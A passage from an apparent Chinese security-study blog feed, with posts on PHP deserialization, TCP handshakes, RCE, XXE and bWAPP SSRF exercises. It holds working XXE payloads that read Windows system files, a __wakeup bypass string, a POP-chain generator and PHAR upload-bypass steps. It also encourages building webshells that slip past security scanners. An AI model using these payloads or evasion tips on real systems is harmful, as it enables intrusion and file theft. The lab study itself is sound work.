me:变量值</li></ul><p>额外介绍一个知识😝😝😝</p><p><strong>属性</strong></p><ul><li><code>public</code></li><li><code>protected</code>,被序列化的时候属性值会变成%00*%00属性名</li><li><code>private</code>,被序列化的时候属性值会变成%00类名%00属性名</li></ul><h2 id="反序列化"><a class="header-anchor" href="#反序列化">¶</a>反序列化</h2><p>将序列化之后的字节流还原成对象、字符、数组等.</p><p><strong>unserialize ()</strong></p><p>unserialize() 会检查是否存在一个<code> __wakeup()</code>魔术方法，如果存在则会先调用<code>__wakeup()</code>方法在进行反序列化可以再__wakeup()方法中对属性进行初始化或者改变。</p><h2 id="PHP反序列化漏洞"><a class="header-anchor" href="#PHP反序列化漏洞">¶</a>PHP反序列化漏洞</h2><p>PHP反序列化漏洞又称PHP对象注入。在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。一旦我们能够控制unserialize()入口，就可能引发对象注入漏洞。</p><p><strong>魔术方法：</strong></p><ul><li><p><code> __wakeup (void)</code></p></li><li><p><code>__sleep()</code></p></li><li><p><code> __construct ([ mixed $args [, $... ]])</code></p><p>具有构造函数的类会在每次创建新对象时先调用此方法。</p></li><li><p><code>__destruct ( void )</code></p><p>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p></li><li><p><code>public string __toString ( void )</code></p><p><code>__toString( ) </code>方法用于一个类被当成字符串时应怎样回应。<strong>此方法必须返回一个字符串</strong></p></li></ul><p>测试一下</p><p><img src="/2021/02/14/re/3.png" alt="3"></p><p>测试结果</p><img src="/2021/02/14/re/4.jpg" alt="4" style="zoom:67%;"><p>由结果可以看出各函数的执行顺序。</p><h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h2><h4 id="wakeup-直接利用"><a class="header-anchor" href="#wakeup-直接利用">¶</a>__wakeup()直接利用</h4><p>当一些漏洞/危害代码在<code>__wakeup() </code>中时，我们可以通过控制序列化字符串直接触发它们。</p><p><img src="/2021/02/14/re/5.png" alt="5"></p><p>测试：</p><img src="/2021/02/14/re/6.jpg" alt="6" style="zoom: 50%;"><p>但是D盾一般可以检测出它，所以要尽可能的构造一个不那么明显的🐎。</p><p>也可以利用别的函数构造eval语句：</p><p><img src="/2021/02/14/re/7.png" alt="7"></p><p>执行结果：</p><img src="/2021/02/14/re/8.jpg" alt="8" style="zoom:67%;"><h4 id="wakeup-绕过"><a class="header-anchor" href="#wakeup-绕过">¶</a>__wakeup( )绕过</h4><p>多数情况下代码无法放入wakeup利用，这时候就要考虑绕过它。反序列化时，<strong>如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。</strong></p><p>举个简单的例子</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123; <span class="hljs-keyword">public</span> $flag = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);&#125;&#125; <span class="hljs-comment">//?code=</span><span class="hljs-meta">?&gt;</span></code></pre><p>序列化得到<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>,直接输入显然不行，需将1改为2（大于一的数皆可）从而绕过wakeup.</p><h4 id="构造-POP-链（同名方法利用）"><a class="header-anchor" href="#构造-POP-链（同名方法利用）">¶</a>构造 POP 链（同名方法利用）</h4><p>PHP 反序列化条件：</p><ul><li><strong>unserialize()</strong> 参数值可控（还可以是 phar 协议）</li><li>调用危险函数路径可通。（就是找攻击点）</li></ul><p>引用 lemon 师傅的demo：</p><p><img src="/2021/02/14/re/9.png" alt="9"></p><p>获取序列化的字符串</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ClassObj;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> evil();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;    <span class="hljs-keyword">private</span> $data = <span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> lemon()));<span class="hljs-meta">?&gt;</span></code></pre><p>执行结果：</p><img src="/2021/02/14/re/10.jpg" alt="10" style="zoom: 50%;"><p>参考：<a href="http://aiyuanzhen.com/index.php/archives/346/#menu_index_15">浅析 PHP 反序列化漏洞的利用与审计</a></p><h4 id="Session反序列化漏洞"><a class="header-anchor" href="#Session反序列化漏洞">¶</a>Session反序列化漏洞</h4><p>相关配置:</p><p>PHP中的Session经序列化后存储，读取时再进行反序列化</p><ul><li><code>session.save_path</code></li><li><code>session.save_handler</code>//设定用户自定义存储函数</li><li><code>session.auto_start boolen </code>//指定会话模块是否在请求开始时启动一个会话</li><li><code>session.serialize_handler string</code>//定义用来序列化/反序列化的处理器名字</li></ul><p>代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>session_start();$_SESSION[<span class="hljs-string">&#x27;test&#x27;</span>]=$_GET[<span class="hljs-string">&#x27;test&#x27;</span>];<span class="hljs-keyword">echo</span> session_id();<span class="hljs-meta">?&gt;</span></code></pre><p>访问得到session_id值</p><p><img src="/2021/02/14/re/11.jpg" alt="11"></p><p>查找<code>session.save_path</code>配置</p><p><img src="/2021/02/14/re/12.jpg" alt="12"></p><p>查找文件</p><p><img src="/2021/02/14/re/13.jpg" alt="13"></p><p>将其命名并存储内容为序列化后的session。</p><p>PHP有三种序列化处理器：</p><ul><li><code>php</code></li><li><code>php_binary</code></li><li><code>php_serialize</code></li></ul><p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的Session序列化格式不同，就可能产生反序列化漏洞。</p><p>思路：我们可以分别写两个代码，两个代码运用不同的序列化处理器处理相同的类来误导”处理器。</p><h2 id="PHAR利用"><a class="header-anchor" href="#PHAR利用">¶</a>PHAR利用</h2><p>PHAR (“<code>Php ARchive</code>”) 是PHP里类似于JAR的一种打包文件，这个特性使得  PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行</p><p>phar详见:<a href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">PHP开发常识：什么是Phar?</a>这里简单介绍一下。</p><p><strong>PHAR文件结构</strong></p><ul><li><code>stub </code>，文件头</li><li><code>manifest describing the contents </code>,文件描述该部分存储文件名、文件大小等信息，如下图所示。</li><li><code>the file contents</code>,文件内容</li><li><code>[optional] a signature for verifying Phar integrity (phar file format only)</code>,签名部分</li></ul><p><strong>利用</strong></p><p>PHAR文件的Meta-data可以是任何能够序列化的PHP对象，当PHAR文件被任何文件系统函数首次通过phar://协议解析时Meta-data部分会被反序列化</p><p>思路：</p><p>1.创建phar文件（<strong>phar.readonly=Off</strong>）</p><p>2.访问phar.php，在同目录下生成phar.phar文件</p><p>3.编写代码利用phar://解析<code>Meta-data</code></p><p>4.添加文件头、修改后缀的方式绕过上传检测(PHP仅通过stub部分判断文件是否为PHAR文件)</p><h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2><p>多实战，本文还是偏理论，还要多思考如何编写可以骗过安全检测软件的🐎~</p><p>参考：<a href="https://xz.aliyun.com/t/2202">PHP反序列化漏洞与Webshell</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/10484832.html">实战经验丨PHP反序列化漏洞总结</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TLS</title>
    <link href="/2021/02/13/TLS/"/>
    <url>/2021/02/13/TLS/</url>
    
    <content type="html"><![CDATA[<h2 id="三次握手"><a class="header-anchor" href="#三次握手">¶</a>三次握手</h2><p>对每次发送的数据量进行跟踪与协商，确保数据段的发送和接收同步，根据所接收到的数据量而确认数据发送、接收完毕后何时撤消联系，并建立虚连接。</p><p>TCP是一种面向连接的单播协议，在发送数据前，通信双方必须在彼此间建立一条连接。所谓的“连接”，其实是客户端和服务器的内存里保存的一份关于对方的信息，如ip地址、端口号等。</p><p>第一次：建立连接时，客户端发送syn包（seq=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）</p><p>第二次：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（seq=k），即SYN+ACK包，此时服务器进入SYN_RECV状态。</p><p>第三次：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入<a href="https://baike.baidu.com/item/ESTABLISHED">ESTABLISHED</a>（TCP连接成功）状态，完成三次握手</p><p><img src="/2021/02/13/TLS/3.png" alt="3"></p><p><strong>SYN_SENT:</strong></p><p>表示客户端已发送SYN报文,与SYN_RCVD相呼应，当客户端SOCKET执行CONNECT连接时，它首先发送SYN报文，随即进入SYN_SENT状态，并等待第2个报文。</p><p><strong>SYN_RCVD:</strong></p><p>表示接受到了SYN报文，是很短暂的一个中间状态（难观察到)在这种状态下，收到客户端的ACK报文后，它会快速进入ESTABLISHED状态</p><p><strong>ETABLISHED</strong></p><p>连接已建立。</p><p>wireshark抓百度的包验证一下</p><p><img src="/2021/02/13/TLS/1.jpg" alt="1"></p><p><code>14.215.177.39</code>是百度的服务器</p><img src="/2021/02/13/TLS/2.jpg" alt="2" style="zoom:67%;"><h2 id="四次挥手"><a class="header-anchor" href="#四次挥手">¶</a>四次挥手</h2><p>连接终止协议。TCP连接是全双工的，因此每个方向都必须单独进行关闭。这原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个  FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭</p><ol><li><p>客户端发送一个FIN段，并包含一个希望接收者看到的自己当前的序列号K. 同时还包含一个ACK表示确认对方最近一次发过来的数据。</p></li><li><p>服务端将K值加1作为ACK序号值，表明收到了上一个包。这时上层的应用程序会被告知另一端发起了关闭操作，通常这将引起应用程序发起自己的关闭操作。</p></li><li><p>服务端发起自己的FIN段，<code>ACK=K+1, Seq=L</code></p></li><li><p>客户端确认<code>ACK=L+1</code></p></li></ol><p><img src="/2021/02/13/TLS/5.png" alt="5"></p><p><strong>FIN_WAIT_1:</strong></p><p><code>FIN_WAIT_1</code>和<code>FIN_WAIT_2</code>都表示等待对方的FIN报文。区别是FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET即进入到FIN_WAIT_1状态。而当对方回应ACK报文后，则进入到FIN_WAIT_2状态。但是FIN_WAIT_1状态比较难见到(因为正常情况下对方会马上回应ACK报文)。</p><p><strong>FIN_WAIT_2:</strong></p><p><code>FIN_WAIT_2</code>状态下的<code>SOCKET</code>，表示半连接(有一方要求close连接，但暂时还有数据需要传送）</p><p><strong>TIME_WAIT:</strong></p><p>表示收到了对方的FIN报文，并发送出ACK报文，两个最大生存期后即可回到原始状态。<strong>如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文可以直接进入到<code>TIME_WAIT</code>状态，而无须经过<code>FIN_WAIT_2</code></strong></p><p><strong>CLOSE_WAIT:</strong></p><p>表示在等待关闭，此状态下需查看是否还有数据发送给对方，若无即可关闭连接。</p><p><strong>LAST_ACK:</strong></p><p>在被动关闭一方在发送FIN报文后，等待对方的ACK报文。</p><p><strong>建立连接需要三次握手，关闭连接需要四次挥手的原因：</strong></p><p>服务端在LISTEN状态（服务器端的某个SOCKET处于监听状态，可接受连接）下，收到建立连接请求的SYN报文后，把ACK和SYN放在一个报文里发送给客户端。而关闭连接时，当收到对方的FIN报文时，仅仅表示对方不再发送数据了但是还能接收数据(上图有讲)，己方是否现在关闭发送数据通道，需要上层应用来决定。</p><p>以上多个状态可以在wireshark可以得到验证，不一一截图辽👻👻👻</p><p>参考：<a href="https://baike.baidu.com/item/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/7794287?fr=aladdin">百度百科</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516">三次握手，四次挥手</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCE</title>
    <link href="/2021/02/13/RCE/"/>
    <url>/2021/02/13/RCE/</url>
    
    <content type="html"><![CDATA[<h1>RCE</h1><p>远程连接命令/代码执行漏洞，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。</p><h2 id="产生原因"><a class="header-anchor" href="#产生原因">¶</a>产生原因</h2><ul><li><p>远程连接命令执行ping</p><p>应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。当设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令让后台进行执行，从而控制整个后台服务器。</p></li><li><p>远程代码执行evel命令木马</p><p>后台有时候会把用户的输入作为代码的一部分没有做过滤直接执行从而造成了远程代码执行漏洞。</p></li></ul><h2 id="危险函数"><a class="header-anchor" href="#危险函数">¶</a>危险函数</h2><ul><li><p><code>eval（)</code></p><p>把字符串当 PHP 代码执行，该字符串必须是 PHP 代码，且以分号结尾。</p><p>在本地测试一下：</p><img src="/2021/02/13/RCE/5.jpg" alt="5" style="zoom:50%;"></li><li><p><code>preg_replace</code></p></li><li><p><code>create_function</code></p></li><li><p><code>array_map</code></p></li><li><p><code>call_user_fu</code></p></li><li><p><code>nc</code></p></li><li><p><code>assert()</code></p><p>判断一个表达式是否成立，与eval()类似。不过eval($code_str)只执行符合php编码规范的$code_str。</p></li><li><p><code>call_user_func_array</code></p></li><li><p><code>array_filter</code></p></li><li><p><code>uasor</code></p></li><li><p><code>proc_popen</code></p></li><li><p><code>passthru()</code></p><p>调用命令，输出返回执行结果。测试：</p><img src="/2021/02/13/RCE/6.jpg" alt="6" style="zoom:67%;"></li><li><p><code>system（）</code></p><p>格式：</p><blockquote><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$shell_return</span>)</span></span></code></pre></blockquote><blockquote><blockquote><p>$shell: 是shell命令, 如’netstat -tnlp’</p></blockquote></blockquote><blockquote><blockquote><p>$shell_return: shell命令执行的返回结果,命令执行成功返回0, 否则不为0</p></blockquote></blockquote><blockquote><blockquote><p>该函数执行后,直接在终端窗口打印命令执行的结果</p></blockquote></blockquote><blockquote><blockquote><p>函数的返回值是命令的执行结果的最后一行</p></blockquote></blockquote><p>在本地测试一下：</p><img src="/2021/02/13/RCE/4.jpg" alt="4" style="zoom: 50%;"></li><li><p><code>exec（）</code></p><p>格式：</p><pre><code class="hljs smali">exec (string command [, string<span class="hljs-built_in"> array </span>[,<span class="hljs-built_in"> int </span>return_var]])</code></pre><p>exec()函数与system()类似，也执行给定的命令，但不输出结果，而是返回结果的最后一行。虽然它只返回命令结果的最后一行，但用第二个参数array可以得到完整的结果，方法是把结果逐行追加到array的结尾处。测试：</p><img src="/2021/02/13/RCE/7.jpg" alt="7" style="zoom:67%;"></li><li><p><code>shell_exec</code></p><p>与exec相似，但shell_exec返回全部信息。</p></li><li><p><code>pcntl_exec</code></p></li></ul><h2 id="漏洞危害"><a class="header-anchor" href="#漏洞危害">¶</a>漏洞危害</h2><ul><li>远程连接命令</li><li>代码执行提权</li><li>获取隐秘数据</li><li>任意文件上传</li><li>写入木马后门文件webshell</li></ul><h2 id="漏洞实践"><a class="header-anchor" href="#漏洞实践">¶</a>漏洞实践</h2><ul><li><p>远程连接命令执行ping</p><p>我们在《command injection》执行过了这里举个例子就好，不再赘述。</p><img src="/2021/02/13/RCE/1.jpg" alt="1" style="zoom:67%;"><p>查看后台源码</p><p><img src="/2021/02/13/RCE/3.jpg" alt="3"></p><p>输入的命令没有处理，直接执行，文件弹出。</p></li><li><p>远程代码执行evel命令木马</p></li></ul><p>​      这个在之前的一句话木马也介绍一大半了</p><p>​      <code>phpinfo();</code></p><img src="/2021/02/13/RCE/8.jpg" alt="8" style="zoom:67%;"><p>​      后台代码：</p><p><img src="/2021/02/13/RCE/2.jpg" alt="2"></p><p>输入代码无过滤，直接执行。</p><h2 id="RCE防御"><a class="header-anchor" href="#RCE防御">¶</a>RCE防御</h2><ul><li>针对危险函数，应该在危险函数代码前写好黑名单过滤特殊符号，或使用 disable_function 等手段</li><li>针对命令注入，尽量不使用命令执行函数，如果必须使用则对用户输入部分加上引号，转义输入后再渲染</li><li>如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略</li></ul><p>RCE漏洞更多的是需要实战的中的黑盒/白盒测试，本文只是梳理了基础知识，等以后接触到再细讲辽~</p><p>🍭🍭🍭🍭<img src="/2021/02/13/RCE/9.png" alt="9"></p><p>参考：<a href="https://www.sinesafe.com/article/20200305/rcebug.html">什么是RCE漏洞？如何对其进行修复加固防御的办法</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/02/10/XXE/"/>
    <url>/2021/02/10/XXE/</url>
    
    <content type="html"><![CDATA[<p>在BWAPP里做SSRF结果任务里出现了XXE，又是一个知识盲区👿 👿 👿 ，故又跑来XXE辽👻👻👻</p><h1>XXE</h1><p><code>XML External Entity</code>，XML 外部实体注入：应用程序在解析XML时没有过滤外部实体的加载，导致加载了恶意的外部文件，造成执行命令、读取文件、扫描内网、攻击内网应用等危害。</p><h2 id="XML"><a class="header-anchor" href="#XML">¶</a>XML</h2><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素。例:</p><p><img src="/2021/02/10/XXE/1.png" alt="1"></p><p>实际上XML还包括<code>PCDATA</code>,<code>CDATA</code>模块:</p><p><strong>PCDATA</strong></p><p>被解析的字符数据（<code>parsed character data</code>）,会被解析器解析的文本。</p><p><strong>CDATA</strong></p><p>字符数据（<code>character data</code>）,不会被解析器解析的文本。当有些内容不想让解析引擎解析执行只是当做原始的内容处理时，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者 &quot; 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分。</p><p>格式：</p><pre><code class="hljs xml">&lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt;</code></pre><p>作用：当某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包裹。</p><p><strong>DTD</strong></p><p>文档类型定义(DTD)可以是内部声明也可以引用外部DTD:</p><ul><li>内部声明DTD格式：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li><li>外部引用DTD格式：<code>&lt;!DOCTYPE 根元素 SYSTEM&quot;文件名&quot;&gt;</code></li><li>引用公共DTD:<code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</code></li></ul><p>DTD中进行实体声明时，将使用ENTITY关键字来声明，实体是用来定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。</p><ul><li><p>内部声明实体格式：<code>&lt;!ENTITY 实体名称 “实体的值&quot;&gt;</code></p><p>一个实体由三部分构成:<code>&amp;</code>, 实体名称, <code>;</code>，<strong><code>&amp;</code>在GET和POST中都需要进行URL编码（使用参数传入xml的，&amp;符号会被认为是参数间的连接符号）</strong></p></li><li><p>引用外部实体格式：<code>&lt;!ENTITY 实体名称  SYSTEM&quot;URI&quot;&gt;</code></p><p>外部引用可支持http，file等协议，但不同的语言支持的协议不同。</p></li><li><p>引用公共实体:<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p></li></ul><p>上面将实体分成了内部实体和外部实体，从另一个角度，实体也可以分成通用实体和参数实体。通用实体是上述<code>&amp;</code>连接的。</p><p>参数实体：</p><ul><li><p>使用 <code>% 实体名</code> 在 DTD 中定义，且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong></p></li><li><p>只有在 DTD 文件中，参数实体的声明才能引用其他实体</p></li><li><p>参数实体也可以外部引用</p></li></ul><h2 id="XXE漏洞利用"><a class="header-anchor" href="#XXE漏洞利用">¶</a>XXE漏洞利用</h2><p>xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p><p>利用方式：</p><ul><li><p>拒绝服务攻击</p></li><li><p>文件读取</p><p>通过加载外部实体，利用file://，php://等伪协议读取本地文件，但是利用file://伪协议无法读取 PHP文件的内容，因为读取的内容会被解析执行看不到源码。可以利用php://伪协议对文件内容进行Base-64编码，这样就可以读到Base-64编码后的源码，然后再通过Base64解码即可（SSRF的BWAPP任务二中有实现）</p></li><li><p>命令(代码)执行</p><p>调用<code>except://</code>伪协议调用系统命令</p></li><li><p>SQL/XSS注入</p></li><li><p>扫描端口</p></li><li><p>内网应用攻击</p></li><li><p>内网探测</p><p>利用XXE进行内网探测，如果端口开启，响应时间会很短，反之，如果关闭，响应时间就长，</p></li></ul><h3 id="Normal-XXE-读本地敏感文件"><a class="header-anchor" href="#Normal-XXE-读本地敏感文件">¶</a>Normal XXE 读本地敏感文件</h3><p><strong>引用外部实体</strong></p><p>本来想在本地测试，结果一堆语法报错，php版本换了几次还是不行，就搭了一个测试平台来测试</p><p>payload:</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span> <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">creds</span> [  </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">goodies</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></code></pre><p>or</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  % <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://localhost/evil.dtd&quot;</span> &gt;</span></span><span class="hljs-meta">%xxe;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;evil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></code></pre><p>外部evil.dtd:</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></code></pre><p>result：</p><img src="/2021/02/10/XXE/2.jpg" alt="2" style="zoom:80%;"><p><strong>特例:</strong></p><p>在上述payload中，若外部引用的文件存在可能会引起 xml  格式混乱的字符(在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,'</code>等就需要进行转义，否则会对XML解释器生成错误)，这时候就要用到上面介绍的CDATA。但我们不能在 xml 中进行拼接（会报错），只能在DTD（使用实体参数）中拼接后在 xml 中调用</p><p><img src="/2021/02/10/XXE/3.png" alt="3"></p><p><strong>内网站点的入侵</strong></p><p>在SSRF中介绍。</p><h3 id="Blind-OOB-XXE"><a class="header-anchor" href="#Blind-OOB-XXE">¶</a>Blind  OOB XXE</h3><p>当服务器不向攻击者的浏览器或代理返回任何响应时，我们就需要构建一条外带数据(OOB)通道来读取数据。虽然我们无法直接查看文件内容，但我们仍然可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。</p><p>原理如下：</p><p><img src="/2021/02/10/XXE/5.png" alt="5"></p><p>没有vps就不演示辽，XXE的BWAPP在SSRF里演示过了，不再赘述</p><h2 id="拓展"><a class="header-anchor" href="#拓展">¶</a>拓展</h2><p><strong>XML Schema</strong>：</p><p>可扩展标记语言架构，定义 XML 文档的合法构建模块，类似 DTD，</p><p><strong>xmlns:</strong></p><p>当多个文档被一起使用时不同文档内容不同但使用定义名称相同的元素，这样就会发生命名冲突，XML解释器无法处理这类冲突，而xmlns可以解决这个问题，我们为标签添加了一个 xmlns 属性，这样就为前缀赋予了一个与某个命名空间相关联的限定名称。此时再把它们放在一起，XML解析器便不会报错。</p><p><img src="/2021/02/10/XXE/4.png" alt="4"></p><p><strong>xsi:schemaLocation属性</strong></p><p>定义XML Namespace和对应的  XSD文档的位置的关系。它的值由一个或多个URI引用对组成，两个URI之间以空白符分隔。第一个URI是定义的  XML  Namespace的值，第二个URI给出Schema文档的位置，Schema处理器将从这个位置读取Schema文档，文档的targetNamespace必须与第一个URI相匹配。</p><p><strong>XML Schema攻击方式</strong></p><ul><li>schemaLocation</li><li>noNamespaceSchemaLocation</li><li>XInclude</li><li>XSLT 攻击</li></ul><p>详见：<a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41#wechat_redirect">我想要一个XXE</a></p><h2 id="漏洞防御"><a class="header-anchor" href="#漏洞防御">¶</a>漏洞防御</h2><ul><li>禁用外部实体。在代码中设置<code>libxml_disable_entity_loader(true)</code></li><li>过滤用户提交的XML数据。过滤关键词为<code>&lt;!DOCTYPE、&lt;!ENTITY、 SYSTEM和PUBLIC</code></li></ul><p>完💖💖💖💖</p><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41#wechat_redirect">我想要一个XXE</a></p><p><a href="https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9626241.html">bwapp亲测xxe漏洞    </a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BWAPP||SSRF</title>
    <link href="/2021/02/10/BWAPP/"/>
    <url>/2021/02/10/BWAPP/</url>
    
    <content type="html"><![CDATA[<p>系统学习SSRF后，我们可以搭个BWAPP练习一下，BWAPP集成了各种常见漏洞和最新漏洞的开源Web应用程序，集成了超过100种漏洞，今天我们要练习一下SSRF部分（找了好久才找到SSRF板块😡😡😡）</p><p><img src="/2021/02/10/BWAPP/1.jpg" alt="1"></p><p>有三个任务：</p><p><img src="/2021/02/10/BWAPP/2.jpg" alt="2"></p><h2 id="Task-One-用远程文件包含进行端口扫描"><a class="header-anchor" href="#Task-One-用远程文件包含进行端口扫描">¶</a>Task One:用远程文件包含进行端口扫描</h2><p>RFI,<code>Remote File Inclusion</code>远程文件包含(文件包含在dvwa那介绍过了)</p><p>从Port scan获得一份端口扫描的攻击脚本</p><p><img src="/2021/02/10/BWAPP/3.jpg" alt="3"></p><p>选择漏洞类型</p><p><img src="/2021/02/10/BWAPP/4.jpg" alt="4"></p><p>执行后发现GET请求明显存在文件包含问题</p><p><img src="/2021/02/10/BWAPP/5.jpg" alt="5"></p><p>构造payload：</p><p><img src="/2021/02/10/BWAPP/6.jpg" alt="6"></p><p>对<code>169.254.7.41</code>主机进行扫描，结果如上，成功~~</p><h2 id="Task-Two：使用XXE获取敏感文件中的内容"><a class="header-anchor" href="#Task-Two：使用XXE获取敏感文件中的内容">¶</a>Task Two：使用XXE获取敏感文件中的内容</h2><p>XXE在另一篇文章《XXE》中介绍了，任务二的ssrf-2.txt给了我们两个代码分别完成两个小任务</p><ul><li><p>访问内部网络上的文件:</p><p><img src="/2021/02/10/BWAPP/8.jpg" alt="8"></p></li><li><p>使用PHPBase64编码器过滤器返回页面的XML模式友好版本：</p></li></ul><p><img src="/2021/02/10/BWAPP/9.jpg" alt="9"></p><p>解码:</p><p><img src="/2021/02/10/BWAPP/10.jpg" alt="10"></p><p>获取敏感文件</p><p><img src="/2021/02/10/BWAPP/7.jpg" alt="7"></p><p>Task Three拒绝服务漏洞尚未接触，等以后学了再来🌝🌝🌝🌝</p><p>参考：<a href="https://www.freebuf.com/column/157466.html">SSRF学习之路</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Reverse Shell</title>
    <link href="/2021/02/08/shell/"/>
    <url>/2021/02/08/shell/</url>
    
